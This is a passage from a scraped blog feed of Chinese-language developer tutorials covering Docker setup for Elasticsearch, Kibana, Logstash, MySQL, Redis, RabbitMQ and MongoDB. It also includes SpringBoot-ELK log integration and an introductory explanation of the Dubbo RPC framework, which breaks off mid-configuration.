&quot;2021-09-15T10:18:09.722761972Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;8.9.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot; }, &quot;tagline&quot; : &quot;You Know, for Search&quot;} # 忘记密码 创建本地超级账户，然后使用 api 接口本地超级账户重置 elastic 账户的密码 停止 elasticsearch 服务 确保你的配置文件中支持本地账户认证支持，如果你使用的是 xpack 的默认配置则无需做特殊修改；如果你配置了其他认证方式则需要确保配置本地认证方式在 ES_HOME/config/elasticsearch.yml 中。 使用命令 ES_HOME/bin/x-pack/users 创建一个基于本地问价认证的超级管理员。 进入 docker 容器中 elasticsearch 中，执行 12docker exec -it elasticsearch /bin/bashbin/x-pack/users useradd test_admin -p test_password -r superuser 启动 elasticsearch 服务 1docker restart elasticsearch 通过 api 重置 elastic 超级管理员的密码 1curl -u test_admin -XPUT -H 'Content-Type: application/json' 'http://localhost:9200/_xpack/security/user/elastic/_password' -d '{&quot;password&quot; : &quot;新密码&quot;}' 校验下密码是否重置成功 1curl localhost:9200 -u elastic # 二、kibana 配置 elasticsearch 密码 文档 修改容器内或者修改挂载出来的 kibana.yml 12docker exec -it kibana /bin/bash # 进入容器内部vi /data/kibana/config/kibana.yml # 挂载目录 kibana.yml 文件添加 123456789# Default Kibana configuration for docker targetserver.host: &quot;0&quot;server.shutdownTimeout: &quot;5s&quot;elasticsearch.hosts: [ &quot;http://172.17.0.3:9200&quot; ]monitoring.ui.container.elasticsearch.enabled: truei18n.locale: &quot;zh-CN&quot;# 此处设置elastic的用户名和密码elasticsearch.username: elasticelasticsearch.password: elastic 重新启动 elasticsearch。 1docker restart kibana 访问网址： 搞定！ 新手最近开始写文章，手敲不易，请多多支持！在此感谢每位读者 0.0 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/10/23/%E3%80%90Docker%E3%80%91docker%E4%B8%AD%E8%AE%BE%E7%BD%AEelasticsearch%E3%80%81kibana%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E3%80%81%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/"},{"title":"使用docker搭建开发环境记录","text":"# 使用 docker 搭建开发环境记录 12345docker start 容器名docker stop 容器名docker restart 容器名docker run = docker create + docker start # mysql 123456789101112131415161718192021222324252627282930313233343536# 拉取镜像docker pull mysql:5.7# 创建实例并启动# -p 映射端口# --name 名称# -v 映射文件# -e MYSQL_ROOT_PASSWORD mysql密码# -d 后台运行并运行docker run -p 3306:3306 --name mysql -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7# 进入容器docker exec -it mysql /bin/bash# 退出容器exit# 配置my.conf## 1.在容器外编辑配置文件vi /mydata/mysql/conf/my.cnf[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]init_connect='SET conllation_connection = utf8_unicode_ci'init_connect='SET NAMES utf8'character-set-server=utf8collation-server=utf8_unicode_ciskip-character-set-client-handshakeskip-name-resolve## 2. 重启mysql容器docker restart mysql## 3. 进入mysql容器验证docker exec -it mysql /bin/bash cat /etc/mysql/my.cnf # Redis 123456789101112131415# 拉取镜像docker pull redis# 配置文件本地：/mydata/redis/data/redis.conf 提前准备好主要配置bind 127.0.0.1 #注释掉这部分，使redis可以外部访问daemonize no#用守护线程的方式启动requirepass 你的密码#给redis设置密码appendonly yes#redis持久化 默认是notcp-keepalive 300 #防止出现远程主机强迫关闭了一个现有的连接的错误 默认是300# 创建实例并启动docker run -p 6379:6379 --name redis -v /mydata/redis/data/redis.conf:/etc/redis/redis.conf -v /mydata/redis/data:/data -d redis redis-server /etc/redis/redis.conf --appendonly yes # Rabbitmq 12345# 拉取镜像management带控制台docker pull rabbitmq:management# 创建实例并启动docker run -d --hostname my-rabbit --name rabbit -v /mydata/rabbitmq:/var/lib/rabbitmq -e RABBITMQ_DEFAULT_USER=root -e RABBITMQ_DEFAULT_PASS=Mm_123456 -p 15672:15672 -p 5672:5672 rabbitmq:management # mongo 12345# 拉取镜像docker pull mongo# 创建实例并启动docker run -p 27017:27017 -v /mydata/mongo:/data/db --name mongodb -d mongo # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/17/%E3%80%90Docker%E3%80%91%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95/"},{"title":"【Docker】关于docker服务报错WARNING IPv4 forwarding is disabled. Networking will not work","text":"# 【Docker】关于 docker 服务报错 WARNING IPv4 forwarding is disabled. Networking will not work 注意：在这里强调，强制进入或者进入镜像，进入后会引起 yum install 和 wget 等不能使用 # 一，docker 运行直接报错 报错： [root@localhost /]# docker run -it ubuntu /bin/bash WARNING: IPv4 forwarding is disabled. Networking will not work. 1. 解决方式： 第一步：在宿主机上执行 echo “net.ipv4.ip_forward=1” &gt;&gt;/usr/lib/sysctl.d/00-system.conf 2. 第二步：重启 network 和 docker 服务 [root@localhost /]# systemctl restart network &amp;&amp; systemctl restart docker 3. 第三步：验证是否成功 可见完美解决问题。 # 二，如果你是 docker 容器运行镜像的时候也是报这种错误，相对应得也是重启一下 docker 就可以完美解决了了。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/14/%E3%80%90Docker%E3%80%91%E5%85%B3%E4%BA%8Edocker%E6%9C%8D%E5%8A%A1%E6%8A%A5%E9%94%99WARNING%20IPv4%20forwarding%20is%20disabled.%20Networking%20will%20not%20work/"},{"title":"【ELK】SpringBoot整合ELK实现分布式日志搜索","text":"# 【ELK】SpringBoot 整合 ELK 实现分布式日志搜索 # 一。环境准备： # 安装 ElasticSearch、Kibana、LogStash。 docker 内，下载需要的镜像。然后启动一个镜像。 # 1.Es 创建 创建并运行一个 ElasticSearch 容器： 12#7.6.2 启动需要增加discovery.type=single-nodedocker run -e ES_JAVA_OPTS=&quot;-Xms256m -Xmx256m&quot; -e discovery.type=single-node -d -p 9200:9200 -p 9300:9300 --name MyES elasticsearch:7.6.2 浏览器访问测试：http://127.0.0.1:9200，应输出如下结果： 1234567891011121314151617{ &quot;name&quot;: &quot;WQawbNC&quot;, &quot;cluster_name&quot;: &quot;docker-cluster&quot;, &quot;cluster_uuid&quot;: &quot;f6QviESlT_e5u3kaZFHoWA&quot;, &quot;version&quot;: { &quot;number&quot;: &quot;7.6.2&quot;, &quot;build_flavor&quot;: &quot;default&quot;, &quot;build_type&quot;: &quot;docker&quot;, &quot;build_hash&quot;: &quot;2f4c224&quot;, &quot;build_date&quot;: &quot;2020-03-18T23:22:18.622755Z&quot;, &quot;build_snapshot&quot;: false, &quot;lucene_version&quot;: &quot;7.7.2&quot;, &quot;minimum_wire_compatibility_version&quot;: &quot;5.6.0&quot;, &quot;minimum_index_compatibility_version&quot;: &quot;5.0.0&quot; }, &quot;tagline&quot;: &quot;You Know, for Search&quot;} # 2.Kibana 创建 创建并运行运行一个 Kibana 容器： 创建之前，先查看 ES 在 docker 中的 ip 地址，因为我们的 kibana 在启动的时候需要连接到 ES。 12345678910#先使用命令 docker ps 查看ES容器IDdocker ps#输出如下:CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa266d1ff5c1b elasticsearch:7.6.2 &quot;/usr/local/bin/dock…&quot; 19 hours ago Up 18 hours 0.0.0.0:9200-&gt;9200/tcp, 0.0.0.0:9300-&gt;9300/tcp MyES#通过容器ID，查看容器IP地址。以上的a266d1ff5c1b就是我们ES的容器IDdocker inspect --format '{{ .NetworkSettings.IPAddress }}' a266d1ff5c1b#输出如下:172.17.0.3 得到了 ES 容器 IP 地址之后，创建并运行一个 Kibana 容器。 12#注意，此处的ELASTICSEARCH_URL需替换成上面ES容器的IP地址，否则Kibana连接不到ESdocker run -d --name MyKibana -p 5601:5601 -e ELASTICSEARCH_URL=http://172.17.0.3:9200 kibana:7.6.2 浏览器访问测试：http://127.0.0.1:5601： # 3.LogStash 创建 创建并运行运行一个 LogStash 容器： 1docker run -d -p 9600:9600 -p 4560:4560 --name MyLogStash logstash:7.6.2 运行后，进入容器内部。修改 logstash.yml 配置文件： 1docker exec -it 容器ID bash 1cd config 1vi logstash.yml 12345# 改成如下配置http.host: &quot;0.0.0.0&quot;xpack.monitoring.elasticsearch.hosts: [ &quot;http://esIP地址:9200&quot; ]xpack.monitoring.elasticsearch.username: elasticxpack.monitoring.elasticsearch.password: your password 修改 pipeline 下的 logstash.conf 文件 123456789101112131415161718192021222324input { tcp { #模式选择为server mode =&gt; &quot;server&quot; #ip和端口对应docker对外暴露logstash的地址可以使用下面命令查看 #docker inspect logstash | grep IPAddress host =&gt; &quot;172.17.0.3&quot; port =&gt; 4560 codec =&gt; json_lines }}output { elasticsearch { action =&gt; &quot;index&quot; #这里是es的地址，多个es要写成数组的形式 hosts =&gt; &quot;http://你的esIP:9200&quot; user =&gt; elastic #如果es配置了账号密码，要配置账号密码 password =&gt; password #如果es配置了账号密码，要配置账号密码 manage_template =&gt; true #用于kibana过滤，可以填项目名称 必须必须必须小写。 index =&gt; &quot;demologs&quot; }} 最后重启我们的 logstash 1docker restart MyLogStash # 二、 使 ELK 与 SpringBoot 集成 maven 相关依赖： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.elk&lt;/groupId&gt; &lt;artifactId&gt;demo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;demo&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;ch.qos.logback.version&gt;1.2.3&lt;/ch.qos.logback.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;${ch.qos.logback.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;${ch.qos.logback.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-access&lt;/artifactId&gt; &lt;version&gt;${ch.qos.logback.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.logstash.logback&lt;/groupId&gt; &lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt; &lt;version&gt;5.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; logback 配置： 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration debug=&quot;false&quot; scan=&quot;true&quot; scanPeriod=&quot;1 seconds&quot;&gt; &lt;include resource=&quot;org/springframework/boot/logging/logback/base.xml&quot; /&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;appender name=&quot;stash&quot; class=&quot;net.logstash.logback.appender.LogstashTcpSocketAppender&quot;&gt; &lt;destination&gt;你的LogStashIP地址:4560&lt;/destination&gt; &lt;!-- encoder必须配置,有多种可选 --&gt; &lt;encoder charset=&quot;UTF-8&quot; class=&quot;net.logstash.logback.encoder.LogstashEncoder&quot; /&gt; &lt;/appender&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;stash&quot; /&gt; &lt;/root&gt;&lt;/configuration&gt; 日志记录： 123456789101112@RestController@RequestMapping(&quot;/test&quot;)public class ElkController { private final Logger logger = LoggerFactory.getLogger(getClass()); @RequestMapping(&quot;/test&quot;) public String elkAdd(){ logger.info(&quot;日志记录&quot;+System.currentTimeMillis()); return &quot;1&quot;; }} 在 Kibana 中查看创建索引及查看日志： # 可以看到我们的 elk 已经走通了，后面就可以根据自己的实际业务需求去进行修改配置。 # 总结 本次通过 docker 搭建 elk+springboot 的过程还是花费了不少的时间的，还是有所收获的。碰到问题的话尽量去百度查资料，耐心点基本上都是可以解决的。有感兴趣的小伙伴可以一起交流学习呀。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/07/17/%E3%80%90ELK%E3%80%91SpringBoot%E6%95%B4%E5%90%88ELK%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E6%97%A5%E5%BF%97%E6%90%9C%E7%B4%A2/"},{"title":"【ELK】使用Docker搭建ELK","text":"# 文章目录 概念： 安装 elk (这里通过 docker 进行安装) 安装 es 安装 kikana 安装 logstash # 概念： 那么，ELK 到底是什么呢？ “ELK” 是三个开源项目的首字母缩写，这三个项目分别是：Elasticsearch、Logstash 和 Kibana。Elasticsearch 是一个搜索和分析引擎。Logstash 是服务器端数据处理管道，能够同时从多个来源采集数据，转换数据，然后将数据发送到诸如 Elasticsearch 等 “存储库” 中。Kibana 则可以让用户在 Elasticsearch 中使用图形和图表对数据进行可视化 工作流程 在后续 elk 引入了 beats (数据采集器) 后被称为 Elastic Stack 或者 ELK # 安装 elk (这里通过 docker 进行安装) # 安装 es 在 dockerhub 上搜索 es 找到需要的 es 版本 拉取 es 镜像 docker pull elasticsearch:tag 在 dockerhub 官网上可以看到 es 的启动命令 先创建自定义 docker 网络 docker network create elastic ，默认是桥接模式 查看创建的网络 启动 es 镜像，这里我以单机的形式启动 docker run -d --name elasticsearch --net elastic -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:tag 启动之后访问 localhost:9200 ，有数据返回说明启动成功，如下图 修改 es 配置，进入容器 docker exec -it a804 /bin/sh 在 config 目录下的 elasticsearch.yml 文件添加 123http.cors.enabled: true http.cors.allow-origin: &quot;*&quot;12 修改完配置之后，退出容器并重启 # 安装 kikana 从 dockerhub 拉取与 es 对应版本的 kibana docker pull kibana:tag 启动 kibana docker run --name kib-7.6 --net elastic -d -p 5601:5601 kibana:tag 启动之后访问 出现上图是由于 kibanakibana.yml，默认的地址是 http://elasticsearch:9200, 需要修改为 es 服务 ip 进入到 es 容器里面 docker -it 容器编号 /bin/sh 查看 es 的容器详情 docker inspect a80402dbe9f5 找到网络详情，找到 es 服务的 ip 地址 也可以通过 docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' a804 获取 ip 进入到 kibana 容器，切换到 /usr/share/kibana/config 目录 修改 kibana.yml 文件 修改完 kibana.yml 之后重启 kibana 容器 访问 kibana localhost:5601 到这里 kibana 就安装成功了 # 安装 logstash 从 dockerhub 拉取 logstash docker pull logstash:7.6.2 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/04/02/%E3%80%90ELK%E3%80%91%E4%BD%BF%E7%94%A8Docker%E6%90%AD%E5%BB%BAELK/"},{"title":"【Dubbo】Dubbo详解，用心看这一篇文章就够了【重点】","text":"# 【Dubbo】Dubbo 详解，用心看这一篇文章就够了【重点】 # 1.1 Dubbo 概述 Dubbo 是阿里巴巴开源的基于 Java 的高性能 RPC （一种远程调用） 分布式服务框架，致力于提供高性能和透明化的 RPC 远程服务调用方案，以及 SOA 服务治理方案。 每天为 2 千多个服务提供大于 30 亿次访问量支持，并被广泛应用于阿里巴巴集团的各成员站点以及别的公司的业务中。 简单的说， Dubbo 就是个服务框架，如果没有分布式的需求，其实是不需要用的，只有在分布式的时候，才有 Dubbo 这样的分布式服务框架的需求。 并且本质上是个远程服务调用的分布式框架（告别 Web Service 模式中的 WSdl ，以服务者与消费者的方式在 Dubbo 上注册） 其核心部分包含： 1、远程通讯：提供对多种基于长连接的 NIO 框架抽象封装，包括多种线程模型，序列化，以及 “请求 - 响应” 模式的信息交换方式。 2、集群容错：提供基于接口方法的透明远程过程调用，包括多协议支持，以及软负载均衡，失败容错，地址路由，动态配置等集群支持。 3、自动发现：基于注册中心目录服务，使服务消费方能动态的查找服务提供方，使地址透明，使服务提供方可以平滑增加或减少机器。 # 1.2 Dubbo 背景 Dubbo 开始于电商系统，因此在这里先从电商系统的演变讲起。 # 1.2.1 单一应用框架 当网站流量很小时，只需一个应用，将所有功能如下单支付等都部署在一起，以减少部署节点和成本。 缺点：单一的系统架构，使得在开发过程中，占用的资源越来越多，而且随着流量的增加越来越难以维护。 # 1.2.2 垂直应用框架 垂直应用架构解决了单一应用架构所面临的扩容问题，流量能够分散到各个子系统当中，且系统的体积可控，一定程度上降低了开发人员之间协同以及维护的成本，提升了开发效率。 缺点：但是在垂直架构中相同逻辑代码需要不断的复制，不能复用。 # 1.2.3 分布式应用架构 ( RPC ) 当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心。 # 1.2.4 流动计算架构 ( SOA ) 随着服务化的进一步发展，服务越来越多，服务之间的调用和依赖关系也越来越复杂，诞生了面向服务的架构体系 ( SOA )，也因此衍生出了一系列相应的技术，如对服务提供、服务调用、连接处理、通信协议、序列化方式、服务发现、服务路由、日志输出等行为进行封装的服务框架。 # 1.2.5 架构演变详解 从以上是电商系统的演变可以看出架构演变的过程： 1、单应用单服务器； 2、单应用拆分成多个应用并部署到多个服务器； 3、单应用拆分成多个应用并实现分布式部署； 4、流动计算框架（用于提高机器利用率的资源调度和治理中心） # 1.2.5.1 单一应用架构 当网站流量很小时，只需一个应用，将所有功能都部署在一起，以减少部署节点和成本。 此时，用于简化增删改查工作量的 数据访问框架 ( ORM ) 是关键。 # 1.2.5.2 垂直应用架构 当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用拆成互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的 Web 框架 ( MVC ) 是关键。 # 1.2.5.3 分布式服务架构 当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的 分布式服务框架 ( RPC ) 是关键。 # 1.2.5.4 流动计算架构 当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的 资源调度和治理中心 ( SOA ) 是关键。 # 1.2.6 RPC 的简介 RPC(Remote Procedure Call Protocol) ：远程过程调用 两台服务器 A、B ，分别部署不同的应用 a,b 。当 A 服务器想要调用 B 服务器上应用 b 提供的函数或方法的时候，由于不在一个内存空间，不能直接调用，需要通过网络来表达调用的语义传达调用的数据。 说白了，就是你在你的机器上写了一个程序，我这边是无法直接调用的，这个时候就出现了一个远程服务调用的概念。 RPC 是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。 RPC 协议假定某些传输协议的存在，如 TCP 或 UDP ，为通信程序之间携带信息数据。在 OSI 网络通信模型中， RPC 跨越了传输层和应用层。 RPC 使得开发包括网络分布式多程序在内的应用程序更加容易。 RPC 采用客户机 / 服务器模式。请求程序就是一个客户机，而服务提供程序就是一个服务器。首先，客户机调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。 # 1.2.6.1 RPC 需要解决的问题 通讯问题：主要是通过在客户端和服务器之间建立 TCP 连接，远程过程调用的所有交换的数据都在这个连接里传输。连接可以是按需连接，调用结束后就断掉，也可以是长连接，多个远程过程调用共享同一个连接。 寻址问题：A 服务器上的应用怎么告诉底层的 RPC 框架，如何连接到 B 服务器（如主机或 IP 地址）以及特定的端口，方法的名称名称是什么，这样才能完成调用。比如基于 Web 服务协议栈的 RPC ，就要提供一个 endpoint URI ，或者是从 UDDI 服务上查找。如果是 RMI 调用的话，还需要一个 RMI Registry 来注册服务的地址。 序列化 与 反序列化：当 A 服务器上的应用发起远程过程调用时，方法的参数需要通过底层的网络协议如 TCP 传递到 B 服务器，由于网络协议是基于二进制的，内存中的参数的值要序列化成二进制的形式，也就是序列化（ Serialize ）或编组（ marshal ），通过寻址和传输将序列化的二进制发送给 B 服务器。 同理， B 服务器接收参数要将参数反序列化。B 服务器应用调用自己的方法处理后返回的结果也要序列化给 A 服务器， A 服务器接收也要经过反序列化的过程。 # 1.3 Dubbo 作用 我们一起来看一下 Dubbo 的服务治理图： # 1.3.1 为什么使用 Dubbo 因为是阿里开源项目，国内很多互联网公司都在用，已经经过很多线上考验。内部使用了 Netty、Zookeeper ，保证了高性能高可用性。 使用 Dubbo 可以将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，可用于提高业务复用灵活扩展，使前端应用能更快速的响应多变的市场需求。 分布式架构可以承受更大规模的并发流量。 # 1.3.2 Dubbo 能做什么 1、透明化的远程方法调用，就像调用本地方法一样调用远程方法，只需简单配置，没有任何 API 侵入。 2、软负载均衡及容错机制，可在内网替代 F5 等硬件负载均衡器，降低成本，减少单点。 3.、服务自动注册与发现，不再需要写死服务提供方地址，注册中心基于接口名查询服务提供者的 IP 地址，并且能够平滑添加或删除服务提供者。 Dubbo 采用全 Spring 配置方式，透明化接入应用，对应用没有任何 API 侵入，只需用 Spring 加载 Dubbo 的配置即可， Dubbo 基于 Spring 的 Schema 扩展进行加载。 # 1.4 Dubbo 和 Spring Cloud 区别 1、通信方式不同： Dubbo 使用的是 RPC 通信，而 Spring Cloud 使用的是 HTTP RESTFul 方式。 2、组成不一样： dubbo 的服务注册中心为 Zookeerper ，服务监控中心为 dubbo-monitor ，无消息总线、服务跟踪、批量任务等组件； Spring Cloud 的服务注册中心为 spring-cloud netflix enruka ，服务监控中心为 spring-boot admin ，有消息总线、数据流、服务跟踪、批量任务等组件； # 1.5 Dubbo 技术架构 首先我们一起来看一下 Dubbo 官网提供的架构图： 节点角色说明 节点 角色说明 Provider 暴露服务的服务提供方 Consumer 调用远程服务的服务消费方 Registry 服务注册与发现的注册中心 Monitor 统计服务的调用次数和调用时间的监控中心 Container 服务运行容器 看了这几个概念后似乎发现其实 Dubbo 的架构也是很简单的 (其实现细节是复杂)，为什么这么说呢，有没有发现，其实很像生产者 - 消费者模型。只是在这种模型上，加上了注册中心和监控中心，用于管理提供方提供的 url ，以及管理整个过程。 调用关系说明 1、服务容器负责启动，加载，运行服务提供者。 2、服务提供者在启动时，向注册中心注册自己提供的服务。 3、服务消费者在启动时，向注册中心订阅自己所需的服务。 4、注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。 5、服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。 6、服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。 那么，整个发布 - 订阅的过程就非常的简单了： 启动容器，加载，运行服务提供者。 服务提供者在启动时，在注册中心发布注册自己提供的服务。 服务消费者在启动时，在注册中心订阅自己所需的服务。 如果考虑失败或变更的情况，就需要考虑下面的过程： 注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。 服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。 服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。 # 1.6 Dubbo 入门案例 # 1.6.1 服务端 首先，我们先把服务端的接口写好，因为其实 dubbo 的作用简单来说就是给消费端提供接口。 接口定义 1234567/** * xml方式服务提供者接口 */public interface ProviderService { String SayHello(String word);} 这个接口非常简单，只是包含一个 SayHello 的方法。 接着，定义它的实现类 12345678/** * xml方式服务提供者实现类 */public class ProviderServiceImpl implements ProviderService{ public String SayHello(String word) { return word; }} 这样我们就把我们的接口写好了，那么我们应该怎么将我们的服务暴露出去呢？ 导入 maven 依赖 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.ouyangsihai&lt;/groupId&gt; &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/dubbo --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.6.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.101tec&lt;/groupId&gt; &lt;artifactId&gt;zkclient&lt;/artifactId&gt; &lt;version&gt;0.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;version&gt;4.1.32.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-framework&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 这里使用的 dubbo 的版本是 2.6.6 ，需要注意的是，如果你只导入 dubbo 的包的时候是会报错的，找不到 netty 和 curator 的依赖，所以，在这里我们需要把这两个的依赖加上，就不会报错了。 另外，这里我们使用 zookeeper 作为注册中心。 到目前为止， dubbo 需要的环境就已经可以了，下面，我们就把上面刚刚定义的接口暴露出去。 暴露接口（ xml 配置方法） 首先，我们在我们项目的 resource 目录下创建 META-INF.spring 包，然后再创建 provider.xml 文件，名字可以任取哦，如下图所示 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:dubbo=&quot;http://code.alibabatech.com/schema/dubbo&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo 